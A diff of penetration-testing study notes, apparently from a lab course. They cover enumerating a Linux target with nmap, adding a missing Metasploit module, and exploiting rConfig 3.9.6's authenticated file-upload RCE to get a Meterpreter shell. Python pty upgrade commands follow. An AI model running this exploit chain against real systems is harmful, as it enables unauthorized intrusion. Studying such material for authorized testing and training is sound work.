@@ -1,76 +1,44 @@
-1. Scan target for web services and version strings.
-2. If rConfig is identified, check the footer for version (e.g., 3.9.6).
-3. Search Metasploit for associated modules.
-4. If local search fails, pull the `.rb` module from the Rapid7 GitHub repository.
-5. Manually add the module to the local Metasploit directory if necessary.
-6. Execute the exploit to obtain a Meterpreter session.
-7. Drop to a system shell and upgrade to a TTY if Python is available.
+# Infiltrating Unix/Linux
 
----
+Standard enum first — OS, web stack versions, running services all feed exploit selection:
 
-## Initial Enumeration
-
-Probing an unknown target to identify the web stack, OS distribution, and running services.
-
-Initial sweep for service versions and default scripts
-
-```
-nmap -sC -sV <TARGET_IP>
+```bash
+nmap -sC -sV <TARGET>
 ```
 
-## Vulnerability Research
+App version in the web UI footer → Google `<app> <version> vulnerability` + check MSF search + check GitHub for modules not yet in local MSF install.
 
-Application name and version are identified via web headers or page footers.
-
-Search local Metasploit database for specific application modules
+If MSF search misses a known exploit, find the `.rb` on Rapid7's GitHub, drop it into:
 
 ```
-search rconfig
+/usr/share/metasploit-framework/modules/exploits/linux/http/
 ```
 
-## Manual Module Integration
+Then `use exploit/linux/http/<module>` — MSF picks it up without restart.
 
-A known vulnerability exists but the **exploit module is missing** from the local Metasploit installation.
-
-Identify the local Metasploit module filesystem path
-
-```
-locate exploits
-```
-
-Update the local Metasploit Framework package
-
-```
-apt update; apt install metasploit-framework
-```
-
-**Gotchas**: **Missing .rb extension** on manually added modules will prevent Metasploit from loading them.
-
-## Exploit Execution
-
-Target is confirmed vulnerable to a specific rConfig RCE and the module is loaded.
-
-Select the specific exploit module and initiate the attack
+rConfig 3.9.6 authenticated file upload RCE — lands Meterpreter as `apache`:
 
 ```
 use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+set RHOSTS <TARGET>
+set LHOST <LHOST>
 exploit
 ```
 
-## TTY Shell Upgrade
-
-The initial shell session is a **non-tty shell** lacking a prompt and the ability to execute interactive commands like `su` or `sudo`.
-
-Verify if Python is installed on the target
+Drop to system shell from Meterpreter:
 
 ```
-which python
+meterpreter > shell
 ```
 
-Force a TTY shell spawn using Python
+---
 
-```
+No prompt after dropping into shell = non-tty shell — `su`/`sudo` won't work. Upgrade with Python if present:
+
+```bash
+which python python3
 python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-**Gotchas**: **Non-TTY shells** often fail to handle environment variables correctly, preventing privilege escalation.
+> [!tip] Non-tty shell is the default when a web app process (apache, www-data) executes your payload — those accounts have no TTY defined in their environment. Always upgrade before attempting privesc steps that need `su` or `sudo`.
